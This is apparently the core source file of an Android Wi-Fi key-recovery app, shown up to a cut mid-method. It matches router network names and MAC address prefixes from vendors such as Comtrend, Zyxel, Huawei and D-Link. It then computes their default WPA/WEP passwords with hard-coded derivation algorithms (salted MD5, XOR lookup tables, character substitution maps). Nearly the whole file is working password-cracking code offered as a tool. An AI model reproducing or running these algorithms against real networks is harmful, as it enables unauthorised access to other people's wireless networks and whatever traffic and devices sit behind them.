package es.pulimento.wifi.core;

import java.math.BigInteger;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import android.util.Log;

public class CrackNetwork {
	// TODO: Constructor based on WirelessNetwork object.

	private String mCapabilities, mESSID, mBSSID;

	// TODO: Review.
	private Matcher[] matcher_md5C, matcher_hawei, matcher_wlan4xx, matcher_md5Z;
	private Matcher matcher_andared, matcher_dlink;
	//private Matcher[] matcher_thomson, matcher_wlan2X;

	public CrackNetwork(WirelessNetwork w) {
		// TODO: Change this when WirelessNetwork is able to process capabilities.
		mCapabilities = w.getCapabilities();
		mESSID = w.getEssid();
		mBSSID = w.getBssid();

		// TODO: Thomson algorithm is disabled.
		//matcher_thomson = new Matcher[9]; //Thomson algorithm...
		//matcher_thomson[0] = Pattern.compile("DLink-([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[1] = Pattern.compile("SpeedTouch([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[2] = Pattern.compile("Thomson([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[3] = Pattern.compile("Bbox-([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[4] = Pattern.compile("privat([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[5] = Pattern.compile("DMAX([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[6] = Pattern.compile("INFINITUM([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[7] = Pattern.compile("Orange-([0-9A-Fa-f]{6})").matcher(essid);
		//matcher_thomson[8] = Pattern.compile("Discus--([0-9A-Fa-f]{6})").matcher(essid);

		/* For WLAN_XXXX and JAZZTEL_XXXX networks. Processed by crack1() COMTREND */
		matcher_md5C = new Matcher[12];
		matcher_md5C[0] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID);	// WLAN_XXXX 64:68:0C:XX:XX:XX
		matcher_md5C[1] = Pattern.compile("(64:68:0C:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5C[2] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID);	// JAZZTEL_XXXX 64:68:0C:XX:XX:XX
		matcher_md5C[3] = Pattern.compile("(64:68:0C:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5C[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID);	// WLAN_XXXX 00:1B:20:XX:XX:XX
		matcher_md5C[5] = Pattern.compile("(00:1B:20:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5C[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID);	// JAZZTEL_XXXX 00:1B:20:XX:XX:XX
		matcher_md5C[7] = Pattern.compile("(00:1B:20:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5C[8] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID);	// WLAN_XXXX 00:1D:20:XX:XX:XX
		matcher_md5C[9] = Pattern.compile("(00:1D:20:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5C[10] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID);	// JAZZTEL_XXXX 00:1D:20:XX:XX:XX
		matcher_md5C[11] = Pattern.compile("(00:1D:20:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5C[4] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID);	//Por lo visto hay 256 claves
		//matcher_md5C[5] = Pattern.compile("(00:1A:2B:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5C[6] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID);
		//matcher_md5C[7] = Pattern.compile("(00:1A:2B:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5C[12] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID);//No est‡ comprobado
		//matcher_md5C[13] = Pattern.compile("(38:72:C0:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5C[14] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID);
		//matcher_md5C[15] = Pattern.compile("(38:72:C0:[0-9A-Fa-f:]{8})").matcher(mBSSID);

		matcher_md5Z = new Matcher[20]; //WLAN_XXXX -- crack4() ZYXEL
		matcher_md5Z[0] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[1] = Pattern.compile("(00:1F:A4:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[2] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[3] = Pattern.compile("(00:1F:A4:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5Z[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX //Son TECOM, no vale
		//matcher_md5Z[5] = Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		//matcher_md5Z[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		//matcher_md5Z[7] = Pattern.compile("(00:19:15:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[4] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[5] = Pattern.compile("(00:23:F8:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[6] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[7] = Pattern.compile("(00:23:F8:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[8] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[9] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[10] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[11] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[12] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[13] = Pattern.compile("(98:F5:37:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[14] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[15] = Pattern.compile("(98:F5:37:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_md5Z[16] = Pattern.compile("WLAN_([0-9a-fA-F]{4})").matcher(mESSID); //WLAN_XXXX
		matcher_md5Z[17] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(mBSSID);//GongJin Electronics Co.
		matcher_md5Z[18] = Pattern.compile("JAZZTEL_([0-9a-fA-F]{4})").matcher(mESSID); //JAZZTEL_XXXX
		matcher_md5Z[19] = Pattern.compile("(F4:3E:61:[0-9A-Fa-f:]{8})").matcher(mBSSID);//GongJin Electronics Co.

		matcher_hawei = new Matcher[29]; //HAWEI (macs only) -- crack3()
		// Los que tienen un simple comentario están verificados, los que tienen DOBLE comentario
		// NO FUNCIONAN, pero como la gente se queja...pues hala...
		matcher_hawei[0] = Pattern.compile("(00:1E:10:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Huawei HG520c, debe de ser compatible!
		matcher_hawei[1] = Pattern.compile("(00:22:A1:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Visto en routerkeygen
		matcher_hawei[2] = Pattern.compile("(00:25:68:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Visto en HG520 español
		matcher_hawei[3] = Pattern.compile("(00:25:9E:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Visto en routerkeygen		
		matcher_hawei[4] = Pattern.compile("(04:C0:6F:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[5] = Pattern.compile("(08:19:A6:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[6] = Pattern.compile("(0C:37:DC:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[7] = Pattern.compile("(10:C6:1F:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[8] = Pattern.compile("(1C:1D:67:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[9] = Pattern.compile("(20:2B:C1:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Visto en routerkeygen
		matcher_hawei[10] = Pattern.compile("(20:F3:A3:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[11] = Pattern.compile("(24:DB:AC:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[12] = Pattern.compile("(28:5F:DB:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[13] = Pattern.compile("(28:6E:D4:[0-9A-Fa-f:]{8})").matcher(mBSSID);		
		matcher_hawei[14] = Pattern.compile("(30:87:30:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////HG265
		matcher_hawei[15] = Pattern.compile("(40:4D:8E:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[16] = Pattern.compile("(4C:54:99:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Visto en Telmex, HG530 (pero en vodafone no funciona!!!!!)
		matcher_hawei[17] = Pattern.compile("(4C:1F:CC:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[18] = Pattern.compile("(54:A5:1B:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_hawei[19] = Pattern.compile("(54:89:98:[0-9A-Fa-f:]{8})").matcher(mBSSID);		
		matcher_hawei[20] = Pattern.compile("(64:16:F0:[0-9A-Fa-f:]{8})").matcher(mBSSID);//Visto a varias VodafoneXXXX
		matcher_hawei[21] = Pattern.compile("(00:E0:FC:[0-9A-Fa-f:]{8})").matcher(mBSSID);//////Huawei wa1003A
		matcher_hawei[22] = Pattern.compile("(00:18:82:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////Por lo visto es el que tiene el Huawei U8100/8150, y otros routers
		//matcher_hawei[23] = Pattern.compile("(30:87:30:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////Visto en algunas Vodafone, pero tb en Orange
		matcher_hawei[23] = Pattern.compile("(24:DB:AC:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////
		matcher_hawei[24] = Pattern.compile("(00:0F:E2:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////
		matcher_hawei[25] = Pattern.compile("(28:6E:D4:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////
		matcher_hawei[26] = Pattern.compile("(00:11:F5:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////
		matcher_hawei[27] = Pattern.compile("(F4:C7:14:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////Es de Orange, no comercializa ese router
		//matcher_hawei[29] = Pattern.compile("(78:1D:BA:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////VodafoneInternetMovil
		matcher_hawei[28] = Pattern.compile("(5C:4C:A9:[0-9A-Fa-f:]{8})").matcher(mBSSID);/////Es de Orange, no comercializa ese router
		matcher_wlan4xx = new Matcher[6]; //WLANXXXXXX, YACOMXXXXXX, WIFIXXXXXX -- crack2()
		matcher_wlan4xx[0] = Pattern.compile("WLAN([0-9a-fA-F]{6})").matcher(mESSID.toUpperCase());
		matcher_wlan4xx[1] = Pattern.compile("([0-9A-Fa-f:]{17})").matcher(mBSSID);
		matcher_wlan4xx[2] = Pattern.compile("WIFI([0-9a-fA-F]{6})").matcher(mESSID.toUpperCase());
		matcher_wlan4xx[3] = Pattern.compile("([0-9A-Fa-f:]{17})").matcher(mBSSID);
		matcher_wlan4xx[4] = Pattern.compile("YACOM([0-9a-fA-F]{6})").matcher(mESSID.toUpperCase());
		matcher_wlan4xx[5] = Pattern.compile("([0-9A-Fa-f:]{17})").matcher(mBSSID);
//		matcher_wlan2X = new Matcher[2]; //WLAN2X, experimental, sólo funciona en un modelo
//		matcher_wlan2X[0] = Pattern.compile("WLAN_([0-9a-fA-F]{2})").matcher(mESSID);
//		matcher_wlan2X[1] = Pattern.compile("(40:4A:03:[0-9A-Fa-f:]{8})").matcher(mBSSID);
		matcher_andared = Pattern.compile("Andared").matcher(mESSID);
		matcher_dlink = Pattern.compile("DLink-[0-9a-fA-F]{6}").matcher(mESSID);
	}
	
	public static String crack1(String iESSID,String iBSSID){//WLAN_XXXX,JAZZTEL_XXXX
		String fijo = "bcgbghgg";
    	String ESSID = iESSID.toUpperCase();
    	String BSSID = "";
    	//Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y la pasamos a mayúsculas
    	String[] aux = iBSSID.split(":");
    	for(String s:aux)BSSID+=s.toUpperCase();
    	//Log.d("pulWifi","Using MD5 algorythm (Comtrend)");
   		//Log.d("pulWifi", "ESSID -> "+ESSID);
   		//Log.d("pulWifi", "MAC -> "+BSSID);
   		String essid_fin = ESSID.substring(ESSID.length()-4,ESSID.length());
   		String principioBSSID = BSSID.substring(0,8);
   		String preMD5 = fijo+principioBSSID+essid_fin+BSSID;
   		//Log.d("pulWifi", "Cadena que se le pasa al MD5 -> "+preMD5);
   		String clave = getMD5(preMD5);
   		//w.setClave(clave);
  		//Log.d("pulWifi", "CLAVE -> "+clave);
   		return clave;
   	}
	
	private static String getMD5(String input) {//crack1() lo necesita
        try {
          //Log.d("pulWifi", "Calculando MD5...");
          MessageDigest md = MessageDigest.getInstance("MD5");
          byte[] messageDigest = md.digest(input.getBytes());
          BigInteger number = new BigInteger(1, messageDigest);
          String hashtext = number.toString(16);
          while (hashtext.length() < 20) {
              hashtext = "0" + hashtext;
          }
          return hashtext.substring(0, 20);
        }
        catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        }
      }
	
	/*private static int charvalue(char ch){//crack2() lo necesita
		switch (ch) {
		case '0': return 0;
		case '1': return 1;
		case '2': return 2;
		case '3': return 3;
		case '4': return 4;
		case '5': return 5;
		case '6': return 6;
		case '7': return 7;
		case '8': return 8;
		case '9': return 9;
		case 'A': return 10;
		case 'B': return 11;
		case 'C': return 12;
		case 'D': return 13;
		case 'E': return 14;
		case 'F': return 15;
		default: return 0;
		}
    }
	
	public static String crack2(String essid, String bssid) { //WLAN4xx algorithm for WLANXXXXXX, WIFIXXXXXX & YACOMXXXXXX...
		//Log.d("pulWifi","Using WLAN4xx algorithm");
		//Log.d("pulWifi", "ESSID -> "+essid);
   		//Log.d("pulWifi", "MAC -> "+bssid);
		String cadenabase = "0000000000000010011000101102002200020220300330003033040044000404405005500050550600660006066070077000707708008800080880900990009099";
	
		int arraybase[][] = new int[11][13];
		
		//Elementos                  YZ
		//String bssid="XX:XX:XX:XX:XX:00";
		int bssidy=charvalue(bssid.charAt(10));
		int bssidz=charvalue(bssid.charAt(11));
		
		
		//Elementos ESSID       
		//String essid="WLANUVWXYZ";
		
		int essidz=charvalue(essid.charAt(5));
		int essidy=charvalue(essid.charAt(4));
		int essidx=charvalue(essid.charAt(3));
		int essidw=charvalue(essid.charAt(2));
		int essidv=charvalue(essid.charAt(1));
	
		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
				arraybase[j][i] = Integer.parseInt(String.valueOf(cadenabase.charAt((int)((13*j)+i))));
	
		
		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
				if((i==1)||(i==5)||(i>6))
					arraybase[j][i] = (arraybase[j][i] + bssidz) %16;
		
		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
				if (i==4)
					arraybase[j][i] = arraybase[j][i+1] ^ bssidy ^ bssidz;

		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
			{
				if ((i==1)||(i==3)||(i==5)||(i==6)||(i==9)||(i==11)||(i==12))
						arraybase[j][i] = (arraybase[j][i]+bssidy)%16;
				if (i==8)
					arraybase[j][i] = (arraybase[j][i]^bssidy);
			}

		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
				if ((i==2))
					arraybase[j][i] = arraybase[j][i] ^ essidw;

		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
			{
				if((i==1)||(i==4)||(i==5))
					arraybase[j][i] = (arraybase[j][i] + essidx)%16;
				if ((i==9)||(i==12))
					arraybase[j][i] = arraybase[j][1] ^ essidx;
				if(i==12)
					arraybase[j][i] = arraybase[j][i] = arraybase[j][i] ^ essidw;
			}

		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
				if((i==2)||(i==6)||(i==10)||(i==12))
					arraybase[j][i]=(arraybase[j][i] ^ ( essidv+ essidw + essidy + essidz))%16;

		for(int j=0;j<10;j++)
			for(int i=0;i<13;i++)
			{
				if ((i==5)||(i==7))
					arraybase[j][i]	=	arraybase[j][i] ^ essidy;
				if ((i==1)||(i==3))
					arraybase[j][i] = arraybase[j][i] ^ essidz;
				//if ((i==4))  arraybase[j][i]=arraybase[j][i+1] ^ essidz;
				//if(((i>=11)&&(i<=12))) arraybase[j][i]=arraybase[j][i] ^ sumyz;
			}
		
		for(int j=0;j<10;j++)
			arraybase[j][0] = arraybase[j][6] ^ arraybase[j][7] ^ arraybase[j][8] ;

		for(int j=0;j<10;j++)
			arraybase[j][4] = arraybase[j][5] ^ essidz ^ bssidz ;

		//Analisis exclusivo del elemento 11
		for(int j=0;j<10;j++)
		{
			arraybase[j][11] = arraybase[j][11]^(essidz+essidy);
			arraybase[j][11] = arraybase[j][12]^(essidw^essidx);
		}
    	
		//Generar lista para exportar
		String passlist[] = new String[11];
		for(int j=0;j<10;j++)
		{
			passlist[j]=new String();
			for(int i=0;i<13;i++)
			{
				switch (arraybase[j][i]) 
				{
					case 10:passlist[j]+="A";break;
					case 11:passlist[j]+="B";break;
					case 12:passlist[j]+="C";break;
					case 13:passlist[j]+="D";break;
					case 14:passlist[j]+="E";break;
					case 15:passlist[j]+="F";break;
					default:passlist[j]+=arraybase[j][i];break;
				}
			}

		}

		StringBuilder s = new StringBuilder();
		for (String sp : passlist) 
			s.append(sp+"\n");
  		//Log.d("pulWifi", "CLAVE -> "+s.toString());
		return s.toString();
	} */
	
	public static String crack2(String ESSID, String BSSID){
		String ssidStr = ESSID.substring(ESSID.length()-6);
		String macStr = BSSID;
		Log.e("pulWifi","Using new WLAN6X algorythm, "+ssidStr+" "+macStr);
		char [] ssidSubPart = {'1', '2','3', '4', '5','6' };/*These values are not revelant.*/
		char [] bssidLastByte = { '6', '6' };
		ssidSubPart[0] = ssidStr.charAt(0);
		ssidSubPart[1] = ssidStr.charAt(1);
		ssidSubPart[2] = ssidStr.charAt(2);
		ssidSubPart[3] = ssidStr.charAt(3);
		ssidSubPart[4] = ssidStr.charAt(4);
		ssidSubPart[5] = ssidStr.charAt(5);
		bssidLastByte[0] = macStr.charAt(15);
		bssidLastByte[1] = macStr.charAt(16);
		for ( int  k = 0; k < 6 ; ++k ) 
		    if( ssidSubPart[k] >= 'A')
		        ssidSubPart[k] = (char)(ssidSubPart[k] - 55);

	    if(bssidLastByte[0] >= 'A' )
	        bssidLastByte[0] = (char)(bssidLastByte[0] - 55);
	    if(bssidLastByte[1] >= 'A' )
	        bssidLastByte[1] = (char)(bssidLastByte[1] - 55);
	    
	    List<String> passList = new ArrayList<String>();
		for ( int i = 0; i < 10 ; ++i )
		{
			/*Do not change the order of this instructions*/
			int aux = i + ( ssidSubPart[3] & 0xf ) +  ( bssidLastByte[0] & 0xf ) + ( bssidLastByte[1] & 0xf );
			int aux1 = ( ssidSubPart[1] & 0xf ) + ( ssidSubPart[2] & 0xf ) + ( ssidSubPart[4] & 0xf ) + ( ssidSubPart[5] & 0xf );
			int second = aux ^ ( ssidSubPart[5] & 0xf );
			int sixth = aux ^ ( ssidSubPart[4] & 0xf );
			int tenth = aux ^ ( ssidSubPart[3] & 0xf );
			int third = aux1 ^ ( ssidSubPart[2] & 0xf );
			int seventh = aux1 ^  ( bssidLastByte[0] & 0xf );
			int eleventh = aux1 ^ ( bssidLastByte[1] & 0xf );
			int fourth =  ( bssidLastByte[0] & 0xf ) ^ ( ssidSubPart[5] & 0xf );
			int eighth = ( bssidLastByte[1] & 0xf ) ^ ( ssidSubPart[4] & 0xf );
			int twelfth = aux ^ aux1;
			int fifth = second ^ eighth;
			int ninth = seventh ^ eleventh;
			int thirteenth = third ^ tenth;
			int first = twelfth ^ sixth;
			String key = Integer.toHexString(first & 0xf) + Integer.toHexString(second & 0xf)+
						Integer.toHexString(third & 0xf) + Integer.toHexString(fourth & 0xf) +
						Integer.toHexString(fifth & 0xf) + Integer.toHexString(sixth & 0xf) +
						Integer.toHexString(seventh & 0xf) + Integer.toHexString(eighth & 0xf) +
						Integer.toHexString(ninth & 0xf) + Integer.toHexString(tenth & 0xf) + 
						Integer.toHexString(eleventh & 0xf) + Integer.toHexString(twelfth & 0xf) +
						Integer.toHexString(thirteenth & 0xf);
			
			passList.add(key.toUpperCase());
		}
		StringBuilder s = new StringBuilder();
		for (String sp : passList) 
			s.append(sp+"\n");
  		Log.d("pulWifi", "CLAVE -> "+s.toString());
		return s.toString();		
	}
	
	private static int hexToDec(char s) {//crack3() lo necesita
		return Integer.parseInt(String.valueOf(s), 16);
	}	

	public static String crack3(String bssid) {// HAWEI
		//Log.d("pulWifi","Using HAWEI algorithm");
   		//Log.d("pulWifi", "MAC -> "+bssid);
		char[] mac2 = bssid.toLowerCase().toCharArray();
		int[] a0 = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
		int[] a1 = { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
		int[] a2 = { 0, 13, 10, 7, 5, 8, 15, 2, 10, 7, 0, 13, 15, 2, 5, 8};
		int[] a3 = { 0, 1, 3, 2, 7, 6, 4, 5, 15, 14, 12, 13, 8, 9, 11, 10};
		int[] a5 = { 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12, 0, 4, 8, 12};
		int[] a7 = { 0, 8, 0, 8, 1, 9, 1, 9, 2, 10, 2, 10, 3, 11, 3, 11};
		int[] a8 = { 0, 5, 11, 14, 6, 3, 13, 8, 12, 9, 7, 2, 10, 15, 1, 4};
		int[] a10 = { 0, 14, 13, 3, 11, 5, 6, 8, 6, 8, 11, 5, 13, 3, 0, 14};
		int[] a14 = { 0, 1, 3, 2, 7, 6, 4, 5, 14, 15, 13, 12, 9, 8, 10, 11};
		int[] a15 = { 0, 1, 3, 2, 6, 7, 5, 4, 13, 12, 14, 15, 11, 10, 8, 9};
		int[] n5 = { 0, 5, 1, 4, 6, 3, 7, 2, 12, 9, 13, 8, 10, 15, 11, 14};
		int[] n6 = { 0, 14, 4, 10, 11, 5, 15, 1, 6, 8, 2, 12, 13, 3, 9, 7};
		int[] n7 = { 0, 9, 0, 9, 5, 12, 5, 12, 10, 3, 10, 3, 15, 6, 15, 6};
		int[] n11 = { 0, 14, 13, 3, 9, 7, 4, 10, 6, 8, 11, 5, 15, 1, 2, 12};
		int[] n12 = { 0, 13, 10, 7, 4, 9, 14, 3, 10, 7, 0, 13, 14, 3, 4, 9};
		int[] n13 = { 0, 1, 3, 2, 6, 7, 5, 4, 15, 14, 12, 13, 9, 8, 10, 11};
		int[] n14 = { 0, 1, 3, 2, 4, 5, 7, 6, 12, 13, 15, 14, 8, 9, 11, 10};
		int[] n31 = { 0, 10, 4, 14, 9, 3, 13, 7, 2, 8, 6, 12, 11, 1, 15, 5};
		int[] key = { 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 61, 62, 63, 64, 65, 66};
		int[] mac = new int[12];
		for(int i = 0; i<12; i++)
			mac[i] = hexToDec(mac2[i]);
		StringBuilder a = new StringBuilder();
		a.append(key[((a2[mac[0]])^(n11[mac[1]])^(a7[mac[2]])^(a8[mac[3]])^(a14[mac[4]])^(a5[mac[5]])^(a5[mac[6]])^(a2[mac[7]])^(a0[mac[8]])^(a1[mac[9]])^(a15[mac[10]])^(a0[mac[11]])^13)]);
		a.append(key[((n5[mac[0]])^(n12[mac[1]])^(a5[mac[2]])^(a7[mac[3]])^(a2[mac[4]])^(a14[mac[5]])^(a1[mac[6]])^(a5[mac[7]])^(a0[mac[8]])^(a0[mac[9]])^(n31[mac[10]])^(a15[mac[11]])^4)]);
		a.append(key[((a3[mac[0]])^(a5[mac[1]])^(a2[mac[2]])^(a10[mac[3]])^(a7[mac[4]])^(a8[mac[5]])^(a14[mac[6]])^(a5[mac[7]])^(a5[mac[8]])^(a2[mac[9]])^(a0[mac[10]])^(a1[mac[11]])^7)]);
		a.append(key[((n6[mac[0]])^(n13[mac[1]])^(a8[mac[2]])^(a2[mac[3]])^(a5[mac[4]])^(a7[mac[5]])^(a2[mac[6]])^(a14[mac[7]])^(a1[mac[8]])^(a5[mac[9]])^(a0[mac[10]])^(a0[mac[11]])^14)]);
		a.append(key[((n7[mac[0]])^(n14[mac[1]])^(a3[mac[2]])^(a5[mac[3]])^(a2[mac[4]])^(a10[mac[5]])^(a7[mac[6]])^(a8[mac[7]])^(a14[mac[8]])^(a5[mac[9]])^(a5[mac[10]])^(a2[mac[11]])^7)]);
  		//Log.d("pulWifi", "CLAVE -> "+a.toString());
		return a.toString();
	}
	
//public static String crack_wlan2X_beta(String MAC){//Ojo a esto!!
//String BSSID = "";
//Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y la pasamos a mayúsculas
//String[] aux = MAC.split(":");
//for(String s:aux)BSSID+=s.toUpperCase();
//Log.d("pulWifi","Usando algoritmo Wlan2X (aún está en pruebas)");
//Log.d("pulWifi","Cadena que se le ha pasado ->"+ MAC);
//String s = "Z"+MAC;
//if(s.length() == 13) {
//String res = s.toUpperCase();
//Log.d("pulWifi","CLAVE -> "+res);
//ShowPass.current.setClave(res);
//ShowPass.current.setCrackeable(true);
//return res;
//} else {
//Log.e("pulWifi","Error en el algoritmo...fallo en el parámetro de entrada");
//return null;
//}
//}
	
	public static String crack4(String iESSID, String iBSSID){
		//String fijo = "bcgbghgg";
    	String ESSID = iESSID.toUpperCase();
    	String BSSID = "";
    	//Tratamos la MAC, para diferenciarla de cuando se intruduce con ':', y la pasamos a mayúsculas
    	String[] aux = iBSSID.split(":");
    	for(String s:aux)BSSID+=s.toUpperCase();
    	//Log.d("pulWifi","Using MD5 algorythm (Zyxel)");
   		//Log.d("pulWifi", "ESSID -> "+ESSID);
   		//Log.d("pulWifi", "MAC -> "+BSSID);
   		String essid_fin = ESSID.substring(ESSID.length()-4,ESSID.length());
   		String principioBSSID = BSSID.substring(0,8);
   		String preMD5 = principioBSSID.toLowerCase()+essid_fin.toLowerCase();
   		//Log.d("pulWifi", "Cadena que se le pasa al MD5 -> "+preMD5);
   		String clave = getMD5(preMD5);
   		//w.setClave(clave);
  		//Log.d("pulWifi", "CLAVE -> "+clave);
   		return clave.toUpperCase();	
   	}
	
	public static String crackDLink(String BSSID){
		char hash[] = { 'X', 'r', 'q', 'a', 'H', 'N',
	 			'p', 'd', 'S', 'Y', 'w', 
	 			'8', '6', '2', '1', '5'};
		//Log.e("pulWifi","Bssid pasado por parámetro -> "+BSSID);
		char[] key = new char[20];
		String mac = BSSID;
		key[0]=mac.charAt(11);
		key[1]=mac.charAt(0);		 
		key[2]=mac.charAt(10);
		key[3]=mac.charAt(1);		
		key[4]=mac.charAt(9);
		key[5]=mac.charAt(2);		 
		key[6]=mac.charAt(8);
		key[7]=mac.charAt(3);		
		key[8]=mac.charAt(7);
		key[9]=mac.charAt(4);		
		key[10]=mac.charAt(6);
		key[11]=mac.charAt(5);		
		key[12]=mac.charAt(1);
		key[13]=mac.charAt(6);		
		key[14]=mac.charAt(8);
		key[15]=mac.charAt(9);		
		key[16]=mac.charAt(11);
		key[17]=mac.charAt(2);		
		key[18]=mac.charAt(4);
		key[19]=mac.charAt(10);
		char [] newkey = new char[20];
		char t;
		int index = 0;
		for (int i=0; i < 20 ; i++){
			t=key[i];
			if ((t >= '0') && (t <= '9'))index = t-'0';
			else{
				t=Character.toUpperCase(t);
				if ((t >= 'A') && (t <= 'F'))
					index = t-'A'+10;
				else{
					Log.e("pulWifi","Mierda pa mi (crack_dLink)");
					//return null;
				}
			}
			newkey[i]=hash[index];
		}
		return String.valueOf(newkey, 0, 20);
	}

	public boolean isCrackeable() {
		if(mCapabilities.equals("") || mCapabilities == null)
			return true;
		//for(Matcher match : matcher_thomson)
			//if(match.find())
				//return true;
		for(int x = 0; x < matcher_md5C.length; x+=2)
			if(matcher_md5C[x].find() && matcher_md5C[x+1].find())
				return true;
		for(int x = 0; x < matcher_md5Z.length; x+=2)
			if(matcher_md5Z[x].find() && matcher_md5Z[x+1].find())
				return true;
		for(Matcher match : matcher_hawei)
			if(match.find() && mCapabilities!=null /*&& mCapabilities.contains("WEP")*/)
				return true;
		for(int x = 0; x < matcher_wlan4xx.length; x+=2)
			if(matcher_wlan4xx[x].find() && matcher_wlan4xx[x+1].find())
				return true;
		//for(int x = 0; x < matcher_wlan2X.length; x+=2)			
			//if(matcher_wlan2X[x].find() && matcher_wlan2X[x+1].find())
				//return true;
		if(matcher_andared.find())return true;
		if(matcher_dlink.find())return true;
		return false;
	}

	public String crackNetwork() {
		if(mCapabilities.equals("") || mCapabilities == null)
			return "NOPASSNOPASSNOPASSNOPASS";	// TODO: Change this to empty string.
		
